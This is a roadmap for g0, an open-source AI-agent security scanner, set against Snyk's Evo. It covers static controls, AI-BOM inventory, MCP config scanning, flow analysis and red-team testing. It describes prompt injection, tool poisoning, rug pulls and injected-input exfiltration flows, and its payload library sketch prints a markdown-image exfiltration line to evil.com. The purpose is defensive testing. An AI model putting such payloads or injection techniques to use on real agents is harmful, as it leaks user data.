# g0: Next Steps — Building the Best AI Agent Security Tool

## Competitive Reality: What Evo Actually Is

Evo is **3 CLI commands** inside the Snyk CLI, all behind `--experimental` and Snyk auth:

```bash
snyk aibom --experimental          # AI Bill of Materials (Python-only)
snyk redteam --experimental        # Adversarial testing (API endpoints only)
snyk mcp-scan --experimental       # MCP server scanning (closed-source Go extension)
```

**Evo's strengths:**
- Backed by Snyk's brand, distribution, and 4M+ existing customers
- Agentic orchestration layer (Evo agent coordinates Discovery/Threat Model/Red Team/Findings agents)
- Full platform: dashboard, policies, STRIDE threat models, visual architecture maps
- `snyk redteam` has 14 vulnerability types with scoring and on-prem scanning agents
- `snyk aibom` produces CycloneDX v1.6 SBOM with HTML visualization

**Evo's weaknesses (g0's opening):**
- `snyk aibom` is **Python-only** — no TypeScript/JavaScript support
- `snyk redteam` requires a **running API endpoint** (type: api only) — no static analysis
- `snyk mcp-scan` is **closed-source** (Go, 19 commits, zero stars)
- All 3 require `--experimental` flag + Snyk auth + internet connection
- **No static analysis of agent code** — they detect components (BOM) but don't analyze security patterns
- Max 3 concurrent scans, max 3 scanning agents per org
- No offline mode, no local-only mode
- 3 separate commands, no unified experience
- Enterprise pricing locks out individual developers

**The gap g0 fills:**

```
                        Evo (Snyk)                  g0 (Guard0)
                        ──────────                  ──────────
Auth required           Yes (snyk auth)             No
Offline/local           No                          Yes
Static analysis         No (BOM only)               Yes (AST-based security rules)
Python support          Yes                         Yes
TypeScript/JS support   No (aibom)                  Yes
Red team from code      No (API endpoint only)      Yes (static + dynamic)
MCP scanning            Closed source               Open source
Standards mapping       Limited                     OWASP + AIUC-1 + ISO 42001 + NIST
Unified CLI             3 separate commands          One tool: g0
Open source             No                          Yes
Cost                    Snyk subscription            Free
```

---

## What Exists Today

| Asset | Status | Details |
|-------|--------|---------|
| **g0 scanner** (`/Guard0/g0`) | Working v0.1.0 | 46 rules, 7 domains, 4 parsers, tree-sitter AST, CLI (scan/gate/init), JSON/HTML/terminal |
| **Controls spec** | 1,140 controls fully specified | 12 domains, each control has description, rationale, test procedure, pass criteria, remediation, code examples |
| **Standards mapping** | 7 frameworks cross-referenced | OWASP Agentic Top 10, AIUC-1, ISO 42001, ISO 23894, NIST AI RMF, OWASP AIVSS, A2AS BASIC |
| **Methodology** | Production-grade spec | Confidence tiers (HIGH/MEDIUM/LOW), <5% FP target, AgentGraph normalization, quality promotion process |
| **Architecture** | Full technical spec | 4-stage pipeline (Discovery → Static → Dynamic → Scoring), config format, control YAML schema, reporter formats |
| **Market analysis** | Complete with data | $7.55B market, 43.8% CAGR, developer pool sizing, competitive landscape, adoption patterns |
| **guard0.ai** | Brand/domain | Enterprise platform positioning |

### The Spec Advantage

This is g0's hidden weapon. The controls documentation alone is **16,600+ lines** of deeply researched, standards-mapped security specifications:

| Domain Doc | Controls | Lines | Sub-Categories |
|-----------|----------|-------|----------------|
| AA-GI (Goal Integrity) | 120 | 1,154 | Indirect injection (20), Direct injection (20), Multi-turn drift (15), Cross-agent propagation (15), Goal persistence under load (15), Framework-specific (15), System prompt integrity (10), Goal alignment (10) |
| AA-IA (Identity & Access) | 100 | 2,049 | Credential management (20), Authorization boundaries (20), Privilege escalation (15), Session management (15), Multi-agent identity (15), Framework-specific (15) |
| AA-CE (Code Execution) | 80 | 2,183 | Code generation safety (20), Unsafe code patterns (20), Sandbox escape (15), Slopsquatting (10), Framework-specific (15) |
| AA-CF (Cascading Failures) | 70 | 1,520 | Error propagation (20), Circuit breakers (15), Blast radius containment (15), Resource exhaustion (20) |
| AA-DL (Data Leakage) | 120 | 1,074 | PII leakage (30), System prompt leakage (25), Cross-user contamination (20), Tool-mediated exfiltration (20), Training data memorization (15), Output filtering (10) |
| AA-TS, AA-SC, AA-MP, AA-IC, AA-HO, AA-RB, AA-RA | 650 | ~8,600 | Remaining 7 domains (specs exist, docs in progress) |

**AIUC-1 is the strategic ace:** It mandates quarterly third-party testing, which means enterprises *must* have automated tooling. g0 provides control-by-control AIUC-1 coverage — no competitor has this.

**No competitor has this depth.** Evo's `snyk redteam` covers 14 vulnerability types. g0's specs define 1,140 controls with test procedures, remediation, and multi-standard mapping. The gap between 14 and 1,140 is the product.

**The plan:** The spec is done. The engine works. Now implement the spec against the engine → ship as `g0`.

---

## Phase 1: Unify and Ship g0 (Weeks 1-3)

**Goal:** `npx g0 scan ./my-agent` gives a developer more value in 10 seconds than Evo gives in 10 minutes of setup.

### 1.1 Set Up the g0 Package

- Create new repo or repurpose test-agent-assess as the `g0` npm package
- Port working engine from `/Guard0/g0` (pipeline, rules, parsers, AST, reporters)
- Package name: `g0` on npm (`npx g0 scan .`)
- Single binary, zero deps for basic use, tree-sitter as optional
- Target: `npx g0` just works, no auth, no config, no internet

### 1.2 Implement Controls from Spec (46 → 200 static)

The specs are written. The engine works. The job is implementing spec → code. Focus on **static-mode controls** first (these work without running the agent):

**Priority: Controls that Evo cannot do (static analysis of agent code)**

| Domain | Current g0 Rules | Spec Controls | Static-Mode | Ship in v1.0 | Source Spec Doc |
|--------|-----------------|---------------|-------------|-------------|-----------------|
| AA-GI (Goal Integrity) | 8 | 120 | ~40 | 25 | `controls/AA-GI-goal-integrity.md` |
| AA-TS (Tool Safety) | 10 | 150 | ~50 | 30 | (to be written) |
| AA-IA (Identity & Access) | 8 | 100 | ~40 | 25 | `controls/AA-IA-identity-access.md` |
| AA-SC (Supply Chain) | 5 | 90 | ~35 | 20 | (to be written) |
| AA-CE (Code Execution) | 6 | 80 | ~30 | 20 | `controls/AA-CE-code-execution.md` |
| AA-MP (Memory & Context) | 4 | 100 | ~35 | 15 | (to be written) |
| AA-DL (Data Leakage) | 5 | 120 | ~20 | 15 | `controls/AA-DL-data-leakage.md` |
| AA-CF (Cascading Failures) | 0 | 70 | ~25 | 15 | `controls/AA-CF-cascading-failures.md` |
| AA-IC (Inter-Agent) | 0 | 80 | ~20 | 15 | (to be written) |
| AA-HO (Human Oversight) | 0 | 60 | ~15 | 10 | (to be written) |
| AA-RB (Reliability & Bounds) | 0 | 100 | ~30 | 10 | (to be written) |
| AA-RA (Rogue Agent) | 0 | 70 | ~10 | 0 | (Phase 2) |
| **TOTAL** | **46** | **1,140** | **~350** | **200** | |

**Implementation approach:**
1. Each spec control (e.g., AA-IA-001: Hardcoded API Key) has detection logic, code examples, and remediation already written
2. Convert spec → g0 rule: AST pattern matcher + regex fallback (existing pattern in g0 engine)
3. Each rule maps to standards via the spec's `standards:` field → auto-populate SARIF/JSON output
4. Use spec's `examples:` sections as test fixtures for validation
5. Apply spec's confidence levels (HIGH/MEDIUM/LOW) and quality tiers (stable/beta)

### 1.3 Beat Evo on Framework Support

Evo's aibom is Python-only. g0 should support everything from day 1:

| Framework | g0 | Evo aibom | Evo redteam |
|-----------|-----|-----------|-------------|
| LangChain/LangGraph (Python) | Yes | Yes | Via API |
| LangChain.js (TypeScript) | Yes | No | Via API |
| CrewAI | Yes | Yes | Via API |
| MCP Servers (Python) | Yes | Partial | No |
| MCP Servers (TypeScript) | Yes | No | No |
| OpenAI Assistants/Agents SDK | Yes | Partial | Via API |
| Vercel AI SDK | **Add** | No | No |
| AWS Bedrock Agents | **Add** | Partial | No |

### 1.4 Output Formats

Keep g0's existing formats, add SARIF:
- **Terminal** — beautiful colored output (existing)
- **JSON** — machine-readable (existing)
- **HTML** — shareable report (existing)
- **SARIF 2.1.0** — GitHub Advanced Security PR annotations (new)
- **CycloneDX** — for BOM interop with Evo/Snyk ecosystem (new, Phase 2)

### 1.5 Ship & Launch

- `npm publish` as `g0`
- GitHub: `guard0-ai/g0`
- README: one-liner install, comparison table, demo GIF
- Launch post: scan 100 popular open-source agents, publish results
- Target: HN front page, AI/security Twitter, r/machinelearning

---

## Phase 2: AI-BOM — Beat snyk aibom (Weeks 3-6)

**Why this is the killer feature:** `snyk aibom` is Python-only, requires auth, requires internet. `g0 inventory` works on any language, offline, instantly.

### 2.1 `g0 inventory` Command

```bash
g0 inventory .

AI Bill of Materials
────────────────────────────────────────
Models
  Claude Sonnet 4.5      Anthropic      src/agent.py:12
  GPT-4o                 OpenAI         src/fallback.ts:8

Frameworks
  LangGraph 0.2.1                       src/agent.py
  Vercel AI SDK 4.1.0                   src/chat.ts

Tools (7)
  search_web             API            src/tools/search.py:15
  run_sql                Database       src/tools/db.py:22
  send_email             Side-effect    src/tools/email.py:8
  read_file              Filesystem     src/tools/fs.ts:12
  ...3 more

MCP Servers
  @modelcontextprotocol/server-github   claude_desktop_config.json
  ./custom-mcp-server                   .cursor/mcp.json

Agents (2)
  CustomerSupportAgent   LangGraph      src/agent.py:25
  EscalationAgent        LangGraph      src/agent.py:89

Vector DBs
  Pinecone                              src/retriever.py:3

Risks
  CRITICAL  OPENAI_API_KEY hardcoded    config.yaml:3
  HIGH      Unverified MCP server       .cursor/mcp.json:12
  MEDIUM    DeepSeek R1 (no license)    src/experimental.py:5
```

### 2.2 What g0 Detects vs snyk aibom

| Component | g0 inventory | snyk aibom |
|-----------|-------------|------------|
| Python models | Yes | Yes |
| TypeScript/JS models | Yes | **No** |
| Agent definitions | Yes (with source location) | Yes |
| Tool definitions | Yes (with permission analysis) | Yes |
| MCP servers (config files) | Yes | Yes |
| MCP servers (code definitions) | Yes | **No** |
| Vector DBs | Yes | Partial |
| Secrets in code/config | Yes | **No** |
| Model licenses/provenance | Yes | Yes |
| YAML/JSON agent configs | Yes (CrewAI, OpenAI) | Partial |
| Requires auth | **No** | Yes |
| Requires internet | **No** | Yes |
| Output: CycloneDX | Yes | Yes |
| Output: Terminal | Yes | **No** (JSON + HTML only) |

### 2.3 Diff Mode (PR-Aware)

```bash
g0 inventory --diff HEAD~1

+ Added model: DeepSeek R1 (src/experimental.py:5)
- Removed tool: run_sql (src/tools/db.py)
~ Changed: CustomerSupportAgent model GPT-4o → Claude Sonnet
! New MCP server added without security review
```

This becomes a PR comment via the GitHub Action — every PR that changes AI components gets an automatic inventory diff.

### 2.4 Output Formats

- Terminal (default)
- JSON
- CycloneDX v1.6 (SBOM standard, compatible with Snyk ecosystem)
- Markdown (for PR comments)

---

## Phase 2.5: Agent Flow Analysis — Our Version of Toxic Flow Analysis (Weeks 4-7, parallel)

**Why:** Invariant Labs' Toxic Flow Analysis is Evo's most technically novel contribution. But TFA requires runtime data. g0 can do the same thing **from static code analysis alone** — making it available to every developer, not just those with production observability.

### 2.5.1 What Agent Flow Analysis Does

Given agent source code, g0 builds a **flow graph** of all potential tool execution sequences and scores them for risk:

```bash
g0 flows .

Agent Flow Analysis
────────────────────────────────────────
Agents: CustomerSupportAgent, EscalationAgent

Flow Graph:
  user_input → CustomerSupportAgent
    → search_kb (read-only, trusted)          SAFE
    → query_db (read, internal)               SAFE
    → send_email (write, external)            WARN  side-effect
    → escalate → EscalationAgent
      → update_ticket (write, internal)       SAFE
      → run_sql (write, internal)             CRIT  no parameterization

Toxic Flows (2):
  CRITICAL  user_input → CustomerSupportAgent → send_email
            Untrusted user input reaches external side-effect tool
            without output validation or approval gate
            Risk: Data exfiltration via crafted email
            Fix: Add human-in-the-loop approval for send_email

  HIGH      user_input → CustomerSupportAgent → escalate → run_sql
            Untrusted input reaches SQL write tool across agent boundary
            without input sanitization at delegation point
            Risk: SQL injection via prompt injection
            Fix: Add parameterized queries + input validation at escalation
```

### 2.5.2 How It Works (Static-Only)

1. **Parse agent code** using existing AST engine + framework parsers
2. **Extract AgentGraph**: agents, tools, delegation chains (existing capability)
3. **Annotate nodes**: For each tool, detect:
   - Trust level: read-only vs write vs delete
   - Scope: internal vs external vs filesystem vs network
   - Data sensitivity: PII patterns, credentials, secrets
   - Side effects: email, HTTP, file write, database write, shell exec
4. **Build flow graph**: All possible paths from user input to tool execution
5. **Score flows**: Flag paths where untrusted input reaches high-risk tools without guards
6. **Output**: Terminal visualization + JSON + SARIF

### 2.5.3 g0 vs Evo TFA

| | Evo TFA | g0 Agent Flow Analysis |
|--|---------|----------------------|
| Data source | Runtime + static | Static only (works without running agent) |
| Requires deployment | Yes (runtime sensor) | No (scans source code) |
| Languages | Python | Python + TypeScript/JavaScript |
| Frameworks | MCP (primary) | LangChain, CrewAI, MCP, OpenAI |
| Online required | Yes | No |
| Flow visualization | Dashboard only | Terminal + JSON + HTML |
| Cost | Snyk subscription | Free |

**The advantage of static-only**: Every developer can see toxic flows during development, before the agent reaches production. Evo's TFA only works once the agent is deployed with runtime sensors. g0 shifts flow analysis left.

---

## Phase 3: MCP Security — Beat snyk mcp-scan (Weeks 4-7, parallel)

**Why:** Snyk's mcp-scan is closed-source, new (Nov 2025), and thin. MCP adoption is exploding. An open-source MCP security scanner is a huge opportunity.

### 3.1 `g0 mcp` Command

```bash
# Scan MCP servers on this machine
g0 mcp

MCP Security Scan
────────────────────────────────────────
Sources: claude_desktop_config.json, .cursor/mcp.json

Servers (4)
  @anthropic/server-github      OK       Verified, 3 tools, read-only
  @anthropic/server-filesystem  WARN     Write access to ~/Documents
  my-custom-server              CRIT     No auth, 12 tools, network access
  @sketchy/data-tool            CRIT     Unknown publisher, shell access

Findings
  CRITICAL  Tool poisoning risk: my-custom-server              [AA-SC-012]
            12 tools exposed without authentication
            Fix: Add authentication to server configuration

  CRITICAL  Unverified publisher: @sketchy/data-tool           [AA-SC-015]
            Package not from a verified npm organization
            Fix: Remove or verify with publisher

  HIGH      Over-permissioned: server-filesystem               [AA-TS-008]
            Write access to entire home directory
            Fix: Restrict to specific directories via allowedDirectories

  MEDIUM    Token over-scoped: server-github                   [AA-IA-003]
            Token has repo:admin (only needs repo:read)
            Fix: Generate new token with minimal scopes
```

### 3.2 What to Scan

**Known MCP config paths** (from Invariant Labs' `well_known_clients.py`):

| Client | macOS | Linux | Windows |
|--------|-------|-------|---------|
| Claude Desktop | `~/Library/Application Support/Claude/claude_desktop_config.json` | — | `~/AppData/Roaming/Claude/claude_desktop_config.json` |
| Claude Code | `~/.claude.json` | `~/.claude.json` | `~/.claude.json` |
| Cursor | `~/.cursor/mcp.json` | `~/.cursor/mcp.json` | `~/.cursor/mcp.json` |
| Windsurf | `~/.codeium/windsurf/mcp_config.json` | `~/.codeium/windsurf/mcp_config.json` | `~/.codeium/windsurf/mcp_config.json` |
| VS Code | `~/Library/Application Support/Code/User/settings.json` + `mcp.json` | `~/.config/Code/User/settings.json`, `~/.vscode/mcp.json` | `~/AppData/Roaming/Code/User/settings.json`, `~/.vscode/mcp.json` |
| Gemini CLI | `~/.gemini/settings.json` | `~/.gemini/settings.json` | — |
| Zed | `~/.config/zed/settings.json` | — | — |
| Cline (VS Code ext) | `~/Library/Application Support/Code/User/globalStorage/saoudrizwan.claude-dev/settings/cline_mcp_settings.json` | (similar) | (similar) |
| Roo Code | `.roo/mcp.json` per project | (similar) | (similar) |

**Capability comparison:**

| Check | g0 mcp | snyk agent-scan |
|-------|--------|-----------------|
| All config paths above | Yes | Yes |
| Tool poisoning detection | Yes | Yes |
| Prompt injection in tool descriptions | Yes | Yes |
| Cross-origin escalation (tool shadowing) | Yes | Yes |
| **Rug pull detection (hash pinning)** | **Yes** | Yes |
| **SKILL.md scanning** | **Yes** | Yes |
| **MCP server source code analysis** | **Yes** | **No** |
| **TypeScript MCP server analysis** | **Yes** | **No** |
| Auth verification | Yes | Unknown |
| Publisher verification (npm) | Yes | Unknown |
| Permission analysis | Yes | Unknown |
| Secret exposure in config | Yes | Unknown |
| Open source | **Yes** | **Partial** (Python CLI open, Go extension closed) |
| Requires auth | **No** | No (standalone) / Yes (Snyk CLI) |

### 3.3 `g0 mcp` Subcommands

```bash
g0 mcp                           # Scan all MCP configs on this machine
g0 mcp scan ./server.py          # Scan a specific MCP server's code
g0 mcp list                      # List all detected MCP servers
g0 mcp verify @org/server-name   # Check publisher and permissions
g0 mcp --watch                   # Watch for config changes, alert on new servers
```

---

## Phase 4: CI/CD Integration (Weeks 5-8, parallel)

### 4.1 GitHub Action

```yaml
name: g0 Security
on: [pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: guard0-ai/g0-action@v1
        with:
          commands: scan,inventory
          min-score: 70
          fail-on: critical
```

### 4.2 What It Does on Every PR

1. **`g0 scan`** — Static analysis, SARIF upload → inline annotations on findings
2. **`g0 inventory --diff`** — AI-BOM diff → PR comment showing what AI components changed
3. **`g0 gate`** — Pass/fail based on score threshold → check status

### 4.3 Pre-commit Hook

```yaml
repos:
  - repo: https://github.com/guard0-ai/g0
    hooks:
      - id: g0-gate
        args: [gate, --no-critical]
```

---

## Phase 5: Dynamic Testing — Beat snyk redteam (Weeks 8-12)

**Why now and not earlier:** Static analysis is the moat. Dynamic testing is table stakes (Promptfoo, Garak, Evo all do it). Ship the unique stuff first.

**Why g0's approach is better than `snyk redteam`:**

| | snyk redteam | g0 test |
|--|-------------|---------|
| Target | API endpoints only (`type: api`) | API + MCP server + local agent process |
| Config | Requires `redteam.yaml` | Auto-configures from `g0 inventory` |
| Auth | Snyk account required | No auth |
| Vulnerability types | 14 | 20+ (adds agent-specific: delegation abuse, memory poisoning, tool chaining) |
| Concurrent scans | Max 3 per org | Unlimited (local) |
| Scanning agents | Max 3, Docker-based | Native, no Docker required |
| Static + dynamic | Dynamic only | **Both** — static findings inform dynamic test targeting |
| Cost | Snyk subscription | Free |

### 5.1 `g0 test` Command

```bash
# Test running agent
g0 test --target http://localhost:8000

# Test MCP server directly (no HTTP needed)
g0 test --mcp ./server.py

# Smart mode: use inventory to auto-discover and test
g0 test --auto

# Specific attacks
g0 test --target http://localhost:8000 --attacks prompt-injection,tool-abuse
```

### 5.2 Smart Test Generation

The killer feature: `g0 test --auto` uses the static analysis + inventory to **generate targeted tests**.

```
g0 found: agent has send_email tool + no input validation (static)
g0 generates: test that tries to make agent send email with exfiltrated data (dynamic)

g0 found: agent uses DeepSeek R1 model + SQL tool (inventory)
g0 generates: prompt injection payloads optimized for DeepSeek + SQL injection via tool params
```

This is something neither Evo nor Promptfoo do — **static-informed dynamic testing**.

### 5.3 Payload Library

Open-source, community-contributed, versioned:
```
payloads/
  prompt-injection/
    direct/          # 200+ direct injection payloads
    indirect/        # Via tool results, documents, emails
    multilingual/    # Non-English bypass attempts
  data-exfiltration/
    markdown-image/  # ![](https://evil.com/?data=PII)
    tool-abuse/      # Exfil via authorized tool calls
  tool-abuse/
    unauthorized/    # Calling tools outside scope
    parameter/       # Malicious params to authorized tools
  ...
```

---

## Phase 6: Guard0 Platform (Weeks 12+)

The conversion point:

```bash
g0 login                      # Auth with guard0.ai
g0 scan . --upload            # Send results to platform
g0 inventory --sync           # Sync AI-BOM to org dashboard
```

**Free CLI → Paid Platform ladder:**

| | g0 CLI (Free) | Guard0 Team ($) | Guard0 Enterprise ($$) |
|--|--------------|-----------------|----------------------|
| Static scan | Unlimited | Unlimited | Unlimited |
| AI-BOM | Local | Org-wide dashboard | Multi-org + API |
| Dynamic testing | Unlimited local | Hosted + scheduling | + custom payloads |
| MCP scanning | Local | Fleet-wide | + policy enforcement |
| CI/CD | GitHub Action | + GitLab, Bitbucket | + policy gates |
| Reports | Terminal/JSON/HTML | Compliance exports | ISO 42001 / SOC2 |
| Trends | No | 90 days | Unlimited |
| Threat modeling | No | Per-app STRIDE | Org-wide + visual |
| Remediation | Fix suggestions | Auto-fix PRs | + Jira integration |

---

## Priority & Sequence

```
Weeks 1-3:   Phase 1   — Ship g0 (static scan, 150+ controls)
Weeks 3-6:   Phase 2   — g0 inventory (AI-BOM)
Weeks 4-7:   Phase 2.5 — g0 flows (Agent Flow Analysis)      ← parallel
Weeks 4-7:   Phase 3   — g0 mcp (MCP security + hash pinning) ← parallel
Weeks 5-8:   Phase 4   — GitHub Action + CI/CD                ← parallel
Weeks 8-12:  Phase 5   — g0 test (dynamic/red team)
Weeks 12+:   Phase 6   — Guard0 platform integration
```

**Phase 1 is the only blocker.** Phases 2, 2.5, 3, and 4 can run in parallel after that.

**New from Evo research:** Phase 2.5 (Agent Flow Analysis) is the highest-leverage addition. It's our static-only version of Invariant's Toxic Flow Analysis — the most technically novel thing Evo does. Phase 3 (MCP) is updated with exact config paths and new checks (rug pull detection, SKILL.md scanning).

---

## What Makes g0 the Best Tool

### The Moat: Depth of Spec + Open Source + Zero Friction

**1. 1,140 controls vs Evo's 14 vulnerability types.** Not just quantity — each g0 control has detection logic, test procedures, pass criteria, remediation with code examples, and multi-standard mapping. This is the deepest agent security spec that exists anywhere, public or private.

**2. AIUC-1 control-by-control coverage.** AIUC-1 mandates quarterly automated testing. g0 is the only tool that maps findings to AIUC-1 controls (A001-F002) with evidence artifacts. This is an enterprise sales weapon: "run `g0 scan` → get your AIUC-1 compliance report."

**3. 7-standard mapping on every finding.** OWASP Agentic Top 10, AIUC-1, ISO 42001, ISO 23894, NIST AI RMF, OWASP AIVSS, A2AS BASIC. No competitor maps to more than 1-2 standards. The security team sees one finding and gets cross-referenced compliance coverage.

**4. Static analysis of agent code.** The only tool in the market that reads agent source code for security patterns using AST parsing. Evo detects *what* AI components exist (BOM). g0 detects *how securely they're used* (security analysis). Both matter, but security analysis is the bigger gap.

**5. Static-informed dynamic testing.** g0 uses scan + inventory results to auto-generate targeted attack payloads. Found `send_email` tool with no validation? Generate email exfiltration test. Found DeepSeek R1 + SQL tool? Generate model-specific prompt injection + SQL injection payloads. Nobody else does this.

**6. Zero friction.** `npx g0 scan .` — no auth, no config, no internet, no running agent needed. Works in 10 seconds. Evo needs `snyk auth` + `--experimental` + internet + Snyk subscription.

**7. Unified CLI.** One tool: `g0 scan`, `g0 inventory`, `g0 mcp`, `g0 test`, `g0 gate`. Evo splits across 3 separate commands with different interfaces.

**8. Polyglot from day 1.** Python AND TypeScript/JavaScript. Evo aibom is Python-only.

**9. Open source.** Community trust, community-contributed controls and payloads, transparent methodology. Evo is closed source.

**10. Free forever for core features.** No subscription gating. Enterprise upsell is the platform (guard0.ai), not the scanner.

---

## Evo Deep-Dive: What We Learned & What It Changes

*Based on research documented in [EVO_RESEARCH.md](./EVO_RESEARCH.md)*

### How Evo Actually Works (The Full Picture)

Evo is not one product — it's **Snyk's entire existing scanner suite (AppRisk + IaC + Cloud + Container + Code) stitched together with an LLM orchestration layer and the Invariant Labs acquisition**.

**The architecture graph** is built from 5+ data sources:
1. **Code scanning** (`snyk aibom` via DeepCode) → AI components in Python source
2. **IaC scanning** (`snyk iac`) → Terraform/CloudFormation resource definitions + topology
3. **Cloud API scanning** (Snyk Cloud) → actual AWS/Azure/GCP resources
4. **Container scanning** (Snyk Container) → image contents, linked to code repos via image SHA matching
5. **Runtime sensor** (eBPF DaemonSet on K8s) → running containers, loaded packages, network connections
6. **Terraform state parsing** → bidirectional link: cloud resource ↔ IaC source ↔ code repo

The correlation chain: **Git Repo → Docker Image (SHA) → K8s Deployment → Cloud Resources → AI SDK Calls**. Snyk AppRisk's "Evidence Graph" stitches these together. An LLM-based "Threat Modeling Agent" then reasons over the combined data to produce STRIDE-style threat models.

**This is years of infrastructure.** Snyk has been building these individual scanners since 2015. Evo wraps them in an agentic chat layer and adds AI-specific detection (AI-BOM) + Invariant Labs' Toxic Flow Analysis.

**Endpoint MCP discovery** uses `agent-scan` (ex `mcp-scan` from Invariant Labs):
- Python CLI with a **hardcoded registry** of well-known config file paths per platform
- Deployed to developer machines via **JAMF/Intune MDM** on recurring schedules
- Scans: Claude Desktop, Claude Code, Cursor, Windsurf, VS Code, Gemini CLI, Zed
- Checks: tool poisoning, prompt injection, cross-origin escalation, rug pulls (via hash pinning)
- Results flow to Evo platform for fleet aggregation

**Toxic Flow Analysis** (TFA) from Invariant Labs:
- Builds a **flow graph** of all potential tool execution sequences
- Annotates nodes with trust level, data sensitivity, exfiltration capability
- Identifies "toxic flows" — tool sequences that could lead to security violations
- Example: `read_email(untrusted) → extract_data → send_to_api(external)`

### What This Changes for g0

#### Things we should NOT try to replicate (Evo's moat = existing infra)
- **Cloud infrastructure graph from IaC/Cloud APIs** — requires years of cloud provider integrations (Terraform, CloudFormation, K8s, AWS/Azure/GCP APIs). This is Snyk's decade-old moat. Don't compete here.
- **Container-to-code SHA matching** — requires container registry integrations and K8s runtime sensors. Enterprise infrastructure play.
- **Fleet MDM deployment** — requires JAMF/Intune partnerships and enterprise IT relationships. Phase 6+ at earliest.
- **DAST/SAST correlation** — requires runtime infrastructure. Later.

#### Things we CAN and SHOULD do (our moat = code-level depth + zero friction)

1. **Toxic Flow Analysis — implement our own version (Phase 2-3)**
   We already have the agent graph (AgentGraph in the scanner). TFA is conceptually similar: build a flow graph of tool sequences, score trust/sensitivity/exfiltration. This is algorithmic, not infrastructure-dependent. And we can do it **from static code analysis alone** — Invariant's TFA requires runtime data, ours works at scan time. Call it something different ("Agent Flow Analysis" or "Tool Chain Analysis").

2. **MCP endpoint scanning with exact same paths (Phase 3)**
   The well-known config paths are public knowledge. We can scan the exact same files `agent-scan` does, **plus more** — we can also parse the MCP server source code (TypeScript AND Python), which Evo's mcp-scan cannot. Our advantage: scan the config AND the code.

3. **Code-level architecture graph (Phase 2)**
   We can't build Evo's infra graph. But we CAN build a **code-level agent flow graph** showing:
   - Agent → Tool calls (with parameters)
   - Agent → Model calls (which LLM, what parameters)
   - Agent → Agent delegation chains
   - Tool → External service calls (detected from SDK usage)
   - Data flow: user input → agent → tool → external service
   This is actually MORE useful for developers than Evo's infra graph because it shows the **security-relevant data flows in code**, not just the deployment topology.

4. **Rug pull detection via hash pinning (Phase 3)**
   Invariant's clever innovation: hash the tool descriptions, alert when they change after approval. We can do this for MCP tool descriptions AND for agent skill definitions. Simple to implement, high security value.

5. **SKILL.md scanning (Phase 3)**
   agent-scan already scans Claude Code SKILL.md files for hidden instructions. We should do this too — it's a new attack vector as agent skills proliferate.

### Updated Competitive Position

```
                        Evo (Snyk)                  g0 (Guard0)
                        ──────────                  ──────────
Auth required           Yes (snyk auth)             No
Offline/local           No                          Yes
Static analysis         No (BOM only)               Yes (AST-based security rules)
Code-level flow graph   No                          Yes (tool chain analysis)
Infra architecture map  Yes (IaC+Cloud+Runtime)     No (code-level only)
Toxic flow analysis     Yes (runtime + static)      Yes (static-only, no runtime needed)
Python support          Yes                         Yes
TypeScript/JS support   No (aibom)                  Yes
MCP config scanning     Yes (agent-scan)            Yes (same paths + code analysis)
MCP code scanning       No                          Yes (parse server source code)
Rug pull detection      Yes (hash pinning)          Yes (hash pinning)
SKILL.md scanning       Yes                         Yes
Fleet/MDM deployment    Yes (JAMF/Intune)           No (CLI only, fleet via CI/CD)
Red team from code      No (API endpoint only)      Yes (static + dynamic)
Standards mapping       Limited                     OWASP + AIUC-1 + ISO 42001 + NIST
Unified CLI             3 separate commands          One tool: g0
Open source             No                          Yes
Cost                    Snyk subscription            Free
```

---

## Immediate Next Actions

### Week 1: Foundation
1. **Set up g0 npm package** in this repo with engine from `/Guard0/g0`
2. **Implement YAML-based control loading** — parse control specs from `controls/` into executable rules (the engine currently has hardcoded JS rules; switch to spec-driven)
3. **Wire standards mapping into output** — each finding carries OWASP + AIUC-1 + ISO 42001 references from the spec

### Week 2: Control Implementation Sprint
4. **Implement AA-IA static controls** from `controls/AA-IA-identity-access.md` — 25 highest-signal credential/access checks (spec has full detection logic + code examples)
5. **Implement AA-CE static controls** from `controls/AA-CE-code-execution.md` — 20 code execution safety checks (unsandboxed exec, shell access, SQL injection, etc.)
6. **Implement AA-CF static controls** from `controls/AA-CF-cascading-failures.md` — 15 error propagation + resource exhaustion checks

### Week 3: Complete Static + Ship
7. **Implement AA-DL static controls** from `controls/AA-DL-data-leakage.md` — 15 static-detectable data leakage patterns
8. **Add SARIF output** — unlocks GitHub PR annotations
9. **Build `g0 inventory`** — model/tool/MCP/agent detection (reuses existing AgentGraph + framework parsers)
10. **Ship to npm as `g0`** — `npx g0 scan .` works everywhere

### Week 4+: Growth
11. **Build `g0 mcp`** — scan all well-known config paths (see Phase 3 table) + MCP server source code
12. **Build `g0 flows`** — static Agent Flow Analysis (see Phase 2.5)
13. **Add rug pull detection** — hash pinning for MCP tool descriptions + SKILL.md scanning
14. **Create GitHub Action** — `guard0-ai/g0-action`
15. **Scan 100 open-source agents** — publish results as launch content
16. **Write remaining domain spec docs** — AA-TS, AA-SC, AA-MP, AA-IC, AA-HO, AA-RB, AA-RA

---

## Appendix: Investigating Evo's Undocumented Graph Correlation

The exact mechanism for how Evo stitches code-level AI components with cloud infrastructure into a unified graph is not publicly documented. Here's how to find out more:

### What We Know

Snyk's correlation chain uses **5+ existing subsystems**:
1. **AppRisk Evidence Graph** — maps Code Repo → Package → Container Image → K8s Deployment using image SHA matching
2. **IaC+ Code-to-Cloud** — maps Terraform source → Terraform state → Cloud Resource ARN using state file parsing
3. **Cloud Context** — scans actual AWS/Azure/GCP accounts via API for real-time resource configs
4. **Runtime Sensor** — eBPF DaemonSet on K8s capturing running containers, loaded packages, network connections
5. **AI-BOM** — detects AI SDK calls (boto3 bedrock-runtime, langchain, openai) in source code
6. **CMDB integrations** — ServiceNow, Backstage, OpsLevel for business context

The missing piece: how does Evo know that the Python code calling `boto3.client('bedrock-runtime')` runs in the ECS task that's behind the API Gateway that's fronted by CloudFront? The most likely answer: **Terraform state files** contain resource IDs that reference each other (CloudFront distribution → API Gateway → ECS service → task definition → container image → code repo), and Snyk follows these reference chains.

### How to Investigate Further

1. **DevSecCon 2025 recordings** (behind registration)
   - URL: https://snyk.io/community/devseccon-2025/snyk-innovations/
   - The live Evo demos likely show the graph construction workflow step by step
   - Register and watch the "Snyk Innovations" track

2. **Request Evo design partner access**
   - URL: https://evo.ai.snyk.io/ ("Get access" button)
   - Actually using Evo on a real project would reveal whether the graph is auto-generated or requires manual input
   - Key question to test: does Evo produce an infra graph for a repo that has NO IaC? If yes, it's doing something beyond Terraform parsing

